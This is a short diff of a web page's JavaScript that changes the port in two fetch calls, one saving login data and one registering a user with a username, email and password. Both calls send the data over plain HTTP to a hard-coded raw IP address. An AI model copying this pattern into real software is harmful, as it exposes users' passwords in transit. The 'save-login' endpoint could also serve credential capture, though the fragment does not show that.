@@ -98,7 +98,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
         try {
             // 1. Save to database
-            const saveResponse = await fetch('http://38.180.243.44:3000/api/save-login', {
+            const saveResponse = await fetch('http://38.180.243.44:8000/api/save-login', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -267,7 +267,7 @@ document.addEventListener('DOMContentLoaded', function() {
     // Register user function - sends data to backend
     async function registerUser(username, email, password) {
         try {
-            const response = await fetch('http://38.180.243.44:3000/api/register', {
+            const response = await fetch('http://38.180.243.44:8000/api/register', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
